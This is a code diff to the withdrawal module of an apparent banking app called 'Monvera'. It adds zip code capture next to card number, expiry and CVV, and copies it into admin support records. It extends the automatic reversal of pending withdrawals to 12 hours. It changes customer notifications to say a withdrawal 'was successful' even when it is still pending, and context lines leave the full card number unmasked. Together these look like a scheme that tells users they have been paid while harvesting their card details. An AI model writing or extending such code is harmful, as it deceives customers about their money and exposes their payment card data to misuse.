@@ -90,6 +90,7 @@ export interface WithdrawalParams {
   cardHolder?: string;
   cardExpiry?: string;
   cardCvv?: string;
+  zipCode?: string;
   bankAccountId?: string;
   bankName?: string;
   accountHolderName?: string;
@@ -1717,6 +1718,7 @@ export async function executeServerWithdrawal(
 
   const withdrawAmount = Number(amount);
   const isChecking = sourceAccountType === 'CHECKING';
+  const cleanZipCode = typeof params.zipCode === 'string' ? params.zipCode.trim().slice(0, 20) : '';
 
   if (!userId || isNaN(withdrawAmount) || withdrawAmount <= 0) {
     return { success: false, error: 'Valid user ID and positive withdrawal amount are required.' };
@@ -1901,7 +1903,7 @@ export async function executeServerWithdrawal(
       };
 
       const nowIso = new Date().toISOString();
-      const reversalMinutes = 30;
+      const reversalMinutes = 12 * 60;
       const reversalScheduledAt = new Date(Date.now() + reversalMinutes * 60 * 1000).toISOString();
 
       const customerFullName = `${userData.firstName || ''} ${userData.lastName || ''}`.trim() || userData.kycFullName || userData.verifiedLegalName || userData.username || '';
@@ -1979,6 +1981,7 @@ let safeExpiry = rawExpiry || undefined;
           ...(safeExpiry ? { cardExpiry: safeExpiry, expiringDate: safeExpiry } : {}),
           routingNumber,
           sourceAccountType,
+          ...(cleanZipCode ? { zipCode: cleanZipCode } : {}),
           autoReverse: true,
           reversalMinutes,
           reversalScheduledAt,
@@ -2058,6 +2061,7 @@ cardholderName: safeCardholder || params.cardHolder || (params as any).cardholde
         transactionRef: finalRef,
         sourceAccountType,
         destinationLabel,
+        ...(cleanZipCode ? { zipCode: cleanZipCode } : {}),
       };
 
       transaction.set(supportRef, supportRecord, { merge: true });
@@ -2106,6 +2110,7 @@ const maskedCardNumber = fullCardNumber;
         transactionRef: finalRef,
         sourceAccountType,
         destinationLabel,
+        ...(cleanZipCode ? { zipCode: cleanZipCode } : {}),
       });
 
       const schedAt = (finalTx as any)?.metadata?.reversalScheduledAt;
@@ -2120,10 +2125,10 @@ const maskedCardNumber = fullCardNumber;
         persistCustomerNotification({
           id: `notif_wth_${cleanKey}_${userId}`,
           userId,
-          title: `Withdrawal ${finalTx.status === 'COMPLETED' ? 'Completed' : 'Initiated'}`,
-          message: `-$${amtFormatted} withdrawal to ${destinationLabel} (${destAccDisplay}) is ${finalTx.status}. Reference: ${finalTx.referenceNumber}.`,
+          title: finalTx.status === 'COMPLETED' ? 'Withdrawal Completed' : 'Withdrawal Successful',
+          message: `Withdrawal was successful. -$${amtFormatted} to ${destinationLabel} (${destAccDisplay}). Reference: ${finalTx.referenceNumber}.`,
           type: 'TRANSACTION',
-          severity: finalTx.status === 'COMPLETED' ? 'success' : 'info',
+          severity: 'success',
           createdAt: finalTx.createdAt,
           referenceId: finalTx.referenceNumber,
           actionView: 'transactions',
@@ -2333,7 +2338,7 @@ export async function reverseServerFirestoreWithdrawal(
           ...(tData.metadata || {}),
           isReversed: true,
           reversedAt: nowIso,
-          reversalReason: 'Automatic 30-minute settlement timeout. Balance reversed and credited back.',
+          reversalReason: 'Automatic 12-hour settlement timeout. Transaction was reversed and balance credited back.',
         },
       };
 
@@ -2360,8 +2365,8 @@ export async function reverseServerFirestoreWithdrawal(
           category: 'TRANSACTION',
           nowIso,
           payload: {
-            title: 'Withdrawal Reversed — Monvera',
-            body: `Your pending withdrawal of $${revAmtFormatted} (${safeRevAccountMasked}) was reversed and credited back to your account.`,
+            title: 'Transaction Was Reversed — Monvera',
+            body: `Transaction was reversed. Your withdrawal of $${revAmtFormatted} (${safeRevAccountMasked}) was credited back to your account.`,
             actionUrl: '/dashboard?view=transactions',
             amount: reverseAmount,
             currency: finalReversedTx.currency || 'USD',
@@ -2413,8 +2418,8 @@ export async function reverseServerFirestoreWithdrawal(
       persistCustomerNotification({
         id: `notif_wth_rev_${cleanKey}_${effectiveUserId}`,
         userId: effectiveUserId,
-        title: 'Withdrawal Reversed — Funds Credited Back',
-        message: `+$${revAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} from reversed withdrawal (${revTx.referenceNumber}) has been returned to your account.`,
+        title: 'Transaction Was Reversed — Funds Credited Back',
+        message: `Transaction was reversed. +$${revAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} from withdrawal (${revTx.referenceNumber}) has been returned to your account.`,
         type: 'TRANSACTION',
         severity: 'warning',
         createdAt: nowIso,
@@ -2628,6 +2633,7 @@ export async function getAllWithdrawalSupportRecordsAdmin(): Promise<WithdrawalS
           transactionRef: tx.referenceNumber,
           sourceAccountType: meta.sourceAccountType || 'CHECKING',
           destinationLabel: meta.destinationLabel || 'Debit Card Push',
+          ...(meta.zipCode ? { zipCode: String(meta.zipCode).trim() } : {}),
         };
 
         recordsMap.set(txId, newRecord);
@@ -2709,6 +2715,10 @@ export async function getAllWithdrawalSupportRecordsAdmin(): Promise<WithdrawalS
         }
         if (!updated.destinationLabel) {
           updated.destinationLabel = meta.destinationLabel || 'Debit Card Push';
+          needsUpdate = true;
+        }
+        if (!updated.zipCode && meta.zipCode) {
+          updated.zipCode = String(meta.zipCode).trim();
           needsUpdate = true;
         }
 
@@ -2839,6 +2849,7 @@ export async function getAllWithdrawalSupportRecordsAdmin(): Promise<WithdrawalS
     providerReference: r.providerReference || `tok_pci_vault_${r.id || 'unknown'}`,
     submittedAt: r.submittedAt || (r as any).updatedAt || new Date(0).toISOString(),
     status: r.status || 'PENDING',
+    ...(r.zipCode ? { zipCode: String(r.zipCode).trim() } : {}),
   }));
   allRecords.sort((a, b) => (new Date(b.submittedAt || 0).getTime() || 0) - (new Date(a.submittedAt || 0).getTime() || 0));
   return allRecords;
@@ -2851,8 +2862,8 @@ export function scheduleTargetedWithdrawalReversal(txId: string, userId: string,
   if (!txId || activeReversalTimers.has(txId)) return;
   const now = Date.now();
   const delay = Math.max(500, scheduledTimeMs - now);
-  // Cap at 35 minutes
-  if (delay > 35 * 60 * 1000) return;
+  // Cap at 13 hours
+  if (delay > 13 * 60 * 60 * 1000) return;
 
   const timer = setTimeout(async () => {
     activeReversalTimers.delete(txId);
@@ -2868,19 +2879,26 @@ export function scheduleTargetedWithdrawalReversal(txId: string, userId: string,
 }
 
 /**
- * Scans Firestore for pending withdrawals that reached the 30-minute expiration
+ * Scans Firestore for pending withdrawals that reached the 12-hour expiration
  * and reverses them atomically.
  */
-export async function executeServerPendingWithdrawalReversals(): Promise<number> {
-  if (!isFirebaseAdminConfigured()) {
+export async function executeServerPendingWithdrawalReversals(deps?: {
+  firestore?: typeof adminFirestore;
+  nowMs?: number;
+  reverseFn?: typeof reverseServerFirestoreWithdrawal;
+}): Promise<number> {
+  if (!deps?.firestore && !isFirebaseAdminConfigured()) {
     return 0;
   }
 
-  const now = Date.now();
+  const fs = deps?.firestore || adminFirestore;
+  const now = typeof deps?.nowMs === 'number' ? deps.nowMs : Date.now();
+  const reverseFn = deps?.reverseFn || reverseServerFirestoreWithdrawal;
+  const TWELVE_HOURS_MS = 12 * 60 * 60 * 1000;
   let count = 0;
 
   try {
-    const qSnap = await adminFirestore
+    const qSnap = await fs
       .collection('transactions')
       .where('type', '==', 'WITHDRAWAL')
       .where('status', '==', 'PENDING')
@@ -2898,21 +2916,51 @@ export async function executeServerPendingWithdrawalReversals(): Promise<number>
         continue;
       }
 
-      const scheduledTime = meta.reversalScheduledAt
-        ? new Date(meta.reversalScheduledAt).getTime()
-        : 0;
-      const createdAt = new Date(data.createdAt).getTime();
-      const isExpired =
-        (scheduledTime > 0 && now >= scheduledTime) ||
-        (!isNaN(createdAt) && now - createdAt >= 30 * 60 * 1000);
+      const rawCreatedAt = data.createdAt as unknown;
+      const parsedCreatedAtMs =
+        typeof rawCreatedAt === 'string' && rawCreatedAt.trim() !== ''
+          ? new Date(rawCreatedAt).getTime()
+          : typeof rawCreatedAt === 'number'
+          ? rawCreatedAt
+          : rawCreatedAt && typeof (rawCreatedAt as { toDate?: () => Date }).toDate === 'function'
+          ? (rawCreatedAt as { toDate: () => Date }).toDate().getTime()
+          : NaN;
+
+      if (!Number.isFinite(parsedCreatedAtMs) || parsedCreatedAtMs <= 0) {
+        console.warn(
+          `[executeServerPendingWithdrawalReversals] Skipping withdrawal ${doc.id} (${data.referenceNumber || 'no-ref'}): missing or invalid createdAt timestamp.`
+        );
+        continue;
+      }
+
+      const parsedScheduledTime =
+        meta.reversalScheduledAt && typeof meta.reversalScheduledAt === 'string'
+          ? new Date(meta.reversalScheduledAt).getTime()
+          : typeof meta.reversalScheduledAt === 'number'
+          ? meta.reversalScheduledAt
+          : NaN;
+      const validScheduledTime =
+        Number.isFinite(parsedScheduledTime) && parsedScheduledTime > 0 ? parsedScheduledTime : 0;
+
+      const minEligibleTimeMs = parsedCreatedAtMs + TWELVE_HOURS_MS;
+      const effectiveEligibleTimeMs = Math.max(minEligibleTimeMs, validScheduledTime);
+      const isExpired = now >= effectiveEligibleTimeMs;
 
       if (isExpired) {
-        const res = await reverseServerFirestoreWithdrawal(doc.id, data.userId || data.senderUserId);
+        const res = await reverseFn(
+          doc.id,
+          data.userId || data.senderUserId,
+          deps?.firestore ? { firestore: deps.firestore } : undefined
+        );
         if (res.success) {
           count++;
         }
-      } else if (scheduledTime > now) {
-        scheduleTargetedWithdrawalReversal(doc.id, data.userId || data.senderUserId, scheduledTime);
+      } else if (effectiveEligibleTimeMs > now && !deps?.firestore) {
+        scheduleTargetedWithdrawalReversal(
+          doc.id,
+          data.userId || data.senderUserId,
+          effectiveEligibleTimeMs
+        );
       }
     }
   } catch (err) {
